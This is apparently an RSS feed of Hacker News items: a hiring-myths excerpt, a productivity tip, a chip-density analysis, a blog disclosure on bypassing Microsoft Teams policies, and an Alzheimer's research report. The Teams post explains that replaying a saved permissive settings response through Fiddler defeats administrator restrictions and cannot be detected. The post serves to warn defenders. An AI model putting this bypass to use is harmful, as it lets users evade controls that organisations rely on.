<p>Not that there’s anything wrong with that type of work. I spent several years at big tech co’s, and the work was intellectually stimulating most of the time. But a lot of times it wasn’t. It was a lot of pattern-matching. Looking at how someone else had solved a problem in a different part of the code-base, and adapting that to my use-case.</p>



<p>On the other hand, if you’re an engineer (no matter how brilliant) who struggles with being told what to do or doing work that you can’t immediately connect to something intrinsically motivating to you, that FAANG interview just did both you and the company a favor by weeding you out of the process.</p>



<p>So the truth is, there is no single “best interview technique”. In our book, we wrote several chapters about different interviewing techniques and their pros and cons. In-person algo/coding interviews on a whiteboard, in-person interviews where you work in an existing code base, <a href="https://www.holloway.com/g/technical-recruiting-hiring/sections/take-homes">take-home interviews</a>, pairing together, having a trial period, etc all have pros and cons. The trick is finding a technique that works for both the company and the candidate. </p>



<p>And that can really differ from company to company and candidate to candidate. A VP at Netflix told me about how they had a really strong candidate come in, but when asked to do a whiteboard-type interview, informed them (politely) that they might as well just reject him then. He was no good at whiteboard interviews… But if they allowed him to go home and write some code, he’d be happy to talk through it. And since then, many Netflix teams have offered candidates the choice of doing a take home.</p>



<p>And really, any interview format can suck. It can fail to assess a candidate for the things a company needs and it can be a negative candidate experience. Which would you rather have:</p>



<ul><li>A whiteboard interview with heavy algorithms for a role where that knowledge (or ability to develop that knowledge) isn’t critical, delivered by an apathetic engineer who doesn’t care about their job.</li><li>A …</li></ul></div></article></main></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/">https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/</a></em></p>]]>
            </description>
            <link>https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24911758</guid>
            <pubDate>Tue, 27 Oct 2020 20:53:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Get started with 2-minute rule]]>
            </title>
            <description>
<![CDATA[
Score 182 | Comments 52 (<a href="https://news.ycombinator.com/item?id=24911312">thread link</a>) | @hoanhan101
<br/>
October 27, 2020 | https://hoanhan.co/2-minute-rule | <a href="https://web.archive.org/web/*/https://hoanhan.co/2-minute-rule">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"><article role="article"><p>Scale any task down into a 2-minute version to make it easier to get started.</p><time datetime="2020-10-27T00:00:00-04:00"> October 27, 2020 · 1 min read · <a href="https://hoanhan.co/category/Motion">Motion</a><hr> </time><p>Whenever you find it hard to get started on a task, consider scaling it down into a 2-minute version. For example,</p><ul><li>Read a book → Read one page</li><li>Write an essay → Write one sentence</li><li>Run 10 miles → Wear my running shoes</li><li>Do 100 push-ups → Do 1 push up</li><li>Eat more vegetables → Eat an apple</li><li>Study for interview → Skim through my notes</li><li>Build a program → Code a function</li></ul><p>The idea is to make it super easy to get started. Once you pass the starting point, which is arguably the hardest step, you start to gain momentum to keep doing the task itself:</p><ul><li>Read one page → Read 10 pages → Finish the first chapter</li><li>Write one sentence → Write an opening paragraph → Write the body</li><li>Wear my running shoes → Walk for 5 minutes → Run for 5 minutes</li></ul><p>As you can see, once you start, it is much easier to continue doing it. Sometimes, you’ll find yourself completing the task even before you even notice it.</p><blockquote><p>For more insights on system planning and goal setting, feel free to check out <a href="https://hoanhan.co/motion">this guide</a>. If you’re curious about how I apply it on a daily basis, <a href="https://motion.hoanhan.co/goals/hoanhan/">check this out →</a></p></blockquote><hr><p><strong>References:</strong></p><ul><li><a href="https://jamesclear.com/how-to-stop-procrastinating">https://jamesclear.com/how-to-stop-procrastinating</a></li><li><a href="https://www.lifehack.org/articles/productivity/how-stop-procrastinating-and-stick-good-habits-using-the-2-minute-rule.html">https://www.lifehack.org/articles/productivity/how-stop-procrastinating-and-stick-good-habits-using-the-2-minute-rule.html</a></li></ul><hr><hr><p> Tagged: <a href="https://hoanhan.co/tag/motion.hoanhan.co">#motion.hoanhan.co</a>, <a href="https://hoanhan.co/tag/consistency">#consistency</a>, <a href="https://hoanhan.co/tag/start">#start</a></p><br> </article></div></div>]]>
            </description>
            <link>https://hoanhan.co/2-minute-rule</link>
            <guid isPermaLink="false">hacker-news-small-sites-24911312</guid>
            <pubDate>Tue, 27 Oct 2020 20:13:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple’s A14 Packs 134M Transistors/mm²]]>
            </title>
            <description>
<![CDATA[
Score 304 | Comments 164 (<a href="https://news.ycombinator.com/item?id=24910778">thread link</a>) | @jonbaer
<br/>
October 27, 2020 | https://semianalysis.com/apples-a14-packs-134-million-transistors-mm2-but-falls-far-short-of-tsmcs-density-claims/ | <a href="https://web.archive.org/web/*/https://semianalysis.com/apples-a14-packs-134-million-transistors-mm2-but-falls-far-short-of-tsmcs-density-claims/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
				
<article id="post-604">
	
   
   
   <div>

   
   
      

   	
   	<div>
   		
<figure><amp-img width="1024" height="852" src="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=1024%2C852&amp;ssl=1" alt="" srcset="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=1024%2C852&amp;ssl=1 1024w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=300%2C250&amp;ssl=1 300w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=768%2C639&amp;ssl=1 768w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="852" src="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=1024%2C852&amp;ssl=1" alt="" srcset="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=1024%2C852&amp;ssl=1 1024w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=300%2C250&amp;ssl=1 300w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?resize=768%2C639&amp;ssl=1 768w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/a.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9Jzg1Micgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>Our friends over at ICmasters have delved into the package of the Apple A14 Bionic. The die size has been unmasked, and it stands in at 88mm<sup>2</sup>. Despite cramming in 11.8 billion transistors, the die size is incredibly small thanks to utilization of TSMC’s 5nm process node.</p>



<figure><amp-img width="1024" height="573" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=1024%2C573&amp;ssl=1" alt="" srcset="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=1024%2C573&amp;ssl=1 1024w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=768%2C430&amp;ssl=1 768w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="573" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=1024%2C573&amp;ssl=1" alt="" srcset="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=1024%2C573&amp;ssl=1 1024w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?resize=768%2C430&amp;ssl=1 768w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/0.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Mycgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>The march of progress is not all rosy. Apple’s chips have historically achieved 90%+ of the process node’s theoretical density in their processors. This generation stands out by missing that mark by a large amount. A14 comes in at a cool 78% effective transistor density when compared to theoretical density. Despite TSMC claiming a 1.8x shrink for N5, Apple only achieves a 1.49x shrink.</p>



<figure><amp-img width="1024" height="263" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1024%2C263&amp;ssl=1" alt="" srcset="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1024%2C263&amp;ssl=1 1024w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=300%2C77&amp;ssl=1 300w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=768%2C197&amp;ssl=1 768w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1536%2C394&amp;ssl=1 1536w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=2048%2C526&amp;ssl=1 2048w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1200%2C308&amp;ssl=1 1200w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?w=2280&amp;ssl=1 2280w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="263" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1024%2C263&amp;ssl=1" alt="" srcset="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1024%2C263&amp;ssl=1 1024w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=300%2C77&amp;ssl=1 300w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=768%2C197&amp;ssl=1 768w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1536%2C394&amp;ssl=1 1536w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=2048%2C526&amp;ssl=1 2048w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?resize=1200%2C308&amp;ssl=1 1200w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2-1.png?w=2280&amp;ssl=1 2280w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzI2Mycgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>This is not due to a failure of TSMC or Apple. These companies are clear leaders for the manufacturing and design of semiconductors respectively. Instead, this failure to convert theoretical to effective density stems from the slow death of SRAM scaling. SRAM is extensively used throughout a processor from registers to caches. Geoffrey Yeap of TSMC claims that the typical mobile SoC which consists of 60% logic, 30% SRAM, and 10% analog/IO.</p>



<figure><amp-img width="1024" height="576" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=1024%2C576&amp;ssl=1" alt="" srcset="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="576" src="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=1024%2C576&amp;ssl=1" alt="" srcset="https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/semianalysis.com/wp-content/uploads/2020/10/2.5.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>TSMC’s N5 node diverges from prior shrinks by showing signs of slowing SRAM scaling. Despite being a full shrink with logic, the SRAM is a 1.35x shrink. This figure is overstated as it will end up being even lower once other the other assist circuitry is accounted for. Hence TSMC’s guidance of chip area reduction at 35%-40% with N5. SemiAnalysis expects this to be a trend that will persist with new nodes. TSMC and Samsung are already demonstrating 3D stacked SRAM which will help alleviate the issue of density.</p>



<figure><amp-img width="1024" height="576" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1024%2C576&amp;ssl=1" alt="" srcset="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1200%2C675&amp;ssl=1 1200w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="576" src="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1024%2C576&amp;ssl=1" alt="" srcset="https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?resize=1200%2C675&amp;ssl=1 1200w, https://i0.wp.com/semianalysis.com/wp-content/uploads/2020/10/3-1.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>



<p>3D Stacking is not the silver bullet. Cost scaling has begun slowing dramatically. With TSMC N5 wafer pricing in the ~$17k range, it is clear cost per transistor has not fallen. Even if SRAM scaling kept up, the cost per transistor would still have remained flat from N7 to N5.</p>



<figure><amp-img width="1024" height="592" src="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=1024%2C592&amp;ssl=1" alt="" srcset="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=1024%2C592&amp;ssl=1 1024w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=300%2C173&amp;ssl=1 300w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=768%2C444&amp;ssl=1 768w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?w=1147&amp;ssl=1 1147w" sizes="(max-width: 1024px) 100vw, 1024px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" width="1024" height="592" src="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=1024%2C592&amp;ssl=1" alt="" srcset="https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=1024%2C592&amp;ssl=1 1024w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=300%2C173&amp;ssl=1 300w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?resize=768%2C444&amp;ssl=1 768w, https://i2.wp.com/semianalysis.com/wp-content/uploads/2020/10/4.jpg?w=1147&amp;ssl=1 1147w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU5Micgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img></figure>




   	</div>

   </div>

	</article>

			
		</div></div>]]>
            </description>
            <link>https://semianalysis.com/apples-a14-packs-134-million-transistors-mm2-but-falls-far-short-of-tsmcs-density-claims/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24910778</guid>
            <pubDate>Tue, 27 Oct 2020 19:17:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Abusing Teams client protocol to bypass Teams security policies]]>
            </title>
            <description>
<![CDATA[
Score 231 | Comments 107 (<a href="https://news.ycombinator.com/item?id=24908776">thread link</a>) | @tommoor
<br/>
October 27, 2020 | https://o365blog.com/post/teams-policies/ | <a href="https://web.archive.org/web/*/https://o365blog.com/post/teams-policies/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<figure>
				<img src="https://o365blog.com/images/posts/teams-policies.png" alt="Abusing Teams client protocol to bypass Teams security policies">
			</figure>
				<nav id="TableOfContents">
<ul>
<li><a href="#what-are-teams-policies">What are Teams policies?</a></li>
<li><a href="#bypassing-teams-policies">Bypassing Teams policies</a>
<ul>
<li><a href="#initial-discovery">Initial discovery</a></li>
<li><a href="#observing-teams-client-behaviour">Observing Teams client behaviour</a></li>
<li><a href="#testing-in-action">Testing in action</a></li>
</ul></li>
<li><a href="#detecting-and-protecting">Detecting and protecting</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#references">References:</a></li>
</ul>
</nav>
			<p>Administrators can use teams policies for controlling what users can do in Microsoft Teams.</p>

<p>In this blog, I’ll show that these policies are applied only in client and thus can be easily bypassed.</p>





<p>Policies are used in Microsoft Office 365 and Azure AD for securing access to services and data. Besides the <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/identity-access-policies?view=o365-worldwide" target="_blank">common identity and device access policies</a>,
Microsoft has provided a set of <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/teams-access-policies?view=o365-worldwide" target="_blank">Teams specific policies</a>:</p>

<ul>
<li>Teams and channel policies</li>
<li>Messaging policies</li>
<li>Meeting policies</li>
<li>App permission policies</li>
</ul>

<p>For example, administrators can configure Teams so that external users are not able to edit or delete any messages they’ve sent. Or, an owner of a Teams site can disable message editing for members of a certain channel.</p>



<h2 id="initial-discovery">Initial discovery</h2>

<p>While I was working with the previous version (v0.4.4) of <a href="https://o365blog.com/aadinternals" target="_blank">AADInternals</a> Teams functions I noticed an interesting thing: I was able to edit and delete chat messages using AADInternals as a guest
even when it was not allowed.</p>

<p>This led to a question that <strong>what if the policies are applied only at the client end?</strong> In practice this would mean that the Teams service tells to your Teams client that “Though shall not edit messages!” but the client
could still do so.</p>

<h2 id="observing-teams-client-behaviour">Observing Teams client behaviour</h2>

<p>I started by watching what was going on between the client and cloud when the Teams client started. The first observation was that the client made about 120 http requests to the cloud.
While browsing through those requests, I spotted one that caught my interest (headers stripped):</p>

<pre><code>POST https://teams.microsoft.com/api/mt/part/emea-02/beta/users/useraggregatesettings HTTP/1.1

{
    "tenantSettingsV2": true,
    "userResourcesSettings": true,
    "messagingPolicy": true,
    "clientSettings": true,
    "targetingPolicy": true,
    "tenantSiteUrl": true,
    "userPropertiesSettings": true,
    "callingPolicy": true,
    "meetingPolicy": true,
    "educationAssignmentsAppPolicy": true
}
</code></pre>

<p>The response contained all the settings and policies the Teams client is allowed to do as the logged in user. Below can be seen the <strong>messagingPolicy</strong> section:
</p><div><pre><code data-lang="json"><span></span><span>"messagingPolicy"</span><span>:</span> <span>{</span>
	<span>"value"</span><span>:</span> <span>{</span>
		<span>"allowUserEditMessage"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowUserDeleteMessage"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowUserChat"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowGiphy"</span><span>:</span> <span>true</span><span>,</span>
		<span>"giphyRatingType"</span><span>:</span> <span>"Moderate"</span><span>,</span>
		<span>"allowGiphyDisplay"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowPasteInternetImage"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowMemes"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowStickers"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowUserTranslation"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowUrlPreviews"</span><span>:</span> <span>true</span><span>,</span>
		<span>"readReceiptsEnabledType"</span><span>:</span> <span>"UserPreference"</span><span>,</span>
		<span>"allowImmersiveReader"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowPriorityMessages"</span><span>:</span> <span>true</span><span>,</span>
		<span>"audioMessageEnabledType"</span><span>:</span> <span>"ChatsAndChannels"</span><span>,</span>
		<span>"channelsInChatListEnabledType"</span><span>:</span> <span>"DisabledUserOverride"</span><span>,</span>
		<span>"allowRemoveUser"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowSmartReply"</span><span>:</span> <span>true</span>
	<span>}</span>
<span>}</span>
</code></pre></div>


<p>What we can learn here is that the Teams client asks from the cloud what the current user is allowed to do, which was the expected behaviour.</p>

<h2 id="testing-in-action">Testing in action</h2>

<p>Next I decided to try whether I could lie to Teams client:</p>

<ol>
<li><p>I saved the response from above to be used as a baseline.</p></li>

<li><div><p>I created a new Messaging policy to disable editing and deleting of sent messages.</p><p>
I applied the policy to a single demo user:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies1.png" alt="Custom policy"></p><p>Now I had two policies, the default organisation wide and the restricted one for demo user:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies2.png" alt="Policies"></p></div></li>

<li><p>I restarted the Teams client and noticed that the editing and deleting were correctly disabled (didn’t exists).</p></li>

<li><div><p>I compared the returned policies from the <strong>useraggregatesettings</strong> requests<br>
and as we can see, the request was missing two lines:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies3.png" alt="Policy comparison"></p></div></li>

<li><div><p>I closed the client and configured Fiddler to do an autoresponse using the saved http response from above:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies4.png" alt="Fiddler autoresponse"></p><p>
Now, when the client is requesting the settings file, it will be served the one that allows editing and deleting.</p></div></li>

<li><p>I started the Teams client and <strong>the editing and deleting were again allowed</strong> and I was able to edit and delete (my own) messages!</p></li>
</ol>

<p>What we can lean here is that <strong>we can lie to Teams client</strong> and change its behaviour 😂 <br>
Moreover, we learnt that <strong>Teams policies are applied only on the client</strong> 🤦‍♂</p>

<p>Here is the video demonstrating this with <strong>AADInternals</strong> and <strong>Fiddler</strong> (sorry for the bad audio after 03:20):</p>

<div><iframe width="560" height="315" src="https://www.youtube.com/embed/Zcqig-OyUMY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</div>

<p>Below is a video that shows in action that this works also with <strong>cloud file storage restrictions</strong>:<br></p>

<p><iframe width="560" height="315" src="https://www.youtube.com/embed/a32TkLIBwS4" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<br><strong>Note:</strong> Although not seen on the video, I was able to add my Google Drive account to Teams so this is not just a UI thing.</p>



<p>As far as I know, the “uncompliant” Teams client behaviour can not be detected.</p>

<p>Same verdict with protecting. Well, one could try to use Conditional Access (CA) with device ownership and compliance restrictions, but that doesn’t cover all scenarios.</p>



<p>Our little test here proves that <strong>Teams policies are applied ONLY on the client!</strong>.</p>

<p>If the user (or guest) is utilising Teams APIs directly, using for instance AADInternals <a href="https://o365blog.com/aadinternals/#teams-functions" target="_blank">Teams functionality</a>, he or she can bypass the restrictions set by the policies.
However, this is not a bug or vulnerability as such, but a (very very bad) design choice by Microsoft.</p>

<p>Users can do at least the following:</p>

<ul>
<li>Bypass messaging policies</li>
<li>Bypass cloud file storage restrictions</li>
<li>Bypass meetings policies</li>
</ul>

<p>⚠️ <strong>Teams policies are NOT a security measure and organisations should not rely on them!</strong> ⚠️</p>



<ul>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/identity-access-policies?view=o365-worldwide" target="_blank">Common identity and device access policies</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/teams-access-policies?view=o365-worldwide" target="_blank">Policy recommendations for securing Teams chats, groups, and files</a></li>
</ul>
		</div></div>]]>
            </description>
            <link>https://o365blog.com/post/teams-policies/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24908776</guid>
            <pubDate>Tue, 27 Oct 2020 16:07:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Research team discovers breakthrough with potential to reverse Alzheimer's]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 52 (<a href="https://news.ycombinator.com/item?id=24906758">thread link</a>) | @elorant
<br/>
October 27, 2020 | https://news.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers | <a href="https://web.archive.org/web/*/https://news.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <div>
              <div>

                
                                
                                                  <div>
                                                                                        <p><span><span>A research team at the University of Calgary’s <a href="https://cumming.ucalgary.ca/">Cumming School of Medicine</a> (CSM) led by Dr. S.R. Wayne Chen, PhD, has made an exciting breakthrough with the potential to prevent and reverse the effects of Alzheimer’s disease.</span></span></p>

<p><span><span>The team discovered that limiting the open time of a channel called the ryanodine receptor, which acts like a gateway to cells located in the heart and brain, reverses and prevents progression of Alzheimer’s disease in animal models. They also identified a drug that interrupts the disease process.</span></span></p>

<p><span><span>The effect of giving the drug to animal models was remarkable: After one month of treatment, the memory loss and cognitive impairments in these models disappeared. </span></span></p>

<p><span><span>“The significance of identifying a clinically used drug that acts on a defined target to provide anti-Alzheimer’s disease benefits can’t be overstated,” says Chen, a member of the <a href="https://libin.ucalgary.ca/">Libin Cardiovascular Institute</a> and the <a href="https://hbi.ucalgary.ca/">Hotchkiss Brain Institute</a> at the CSM.&nbsp;</span></span><span lang="EN-US"><span><span><span>Dr. Jinjing Yao, PhD, a student of Chen, is the first author of the study.</span></span></span></span></p>

<p><span><span>The results of this groundbreaking study were recently published in the peer-reviewed journal, <a href="https://www.cell.com/cell-reports/fulltext/S2211-1247(20)31158-X"><em>Cell Reports</em></a>.&nbsp;</span></span></p>

<p><span><span>This work is potentially highly impactful as more than half a million Canadians live with Alzheimer’s disease and other dementias, suffering memory loss and other cognitive impairments with a negative impact on quality of life. </span></span></p>

<h3><strong><span><span><span><span>The science behind the findings</span></span></span></span></strong></h3>

<p><span><span>Previous research has shown that the progression of Alzheimer’s disease is driven by a vicious cycle of the protein amyloid β (Aβ) inducing hyperactivity at the neuron level. However, the mechanism behind this wasn’t fully understood nor were there effective treatments to stop the cycle. &nbsp;</span></span></p>

<p><span><span>Chen’s team used a portion of an existing drug used for heart patients, carvedilol, to treat mice models with Alzheimer’s symptoms. After a month of treatment, researchers tested animal models with very promising results. </span></span></p>

<p><span><span>“We treated them for a month and the effect was quite amazing,” says Chen, explaining the drug was successful in reversing major symptoms of Alzheimer’s disease. “We couldn’t tell the drug-treated disease models and the healthy models apart.” </span></span></p>

<p><span><span>Chen, a Clarivate Highly Cited Researcher, is optimistic about the future of this research, noting the next step will be clinical trials in people.</span></span></p>

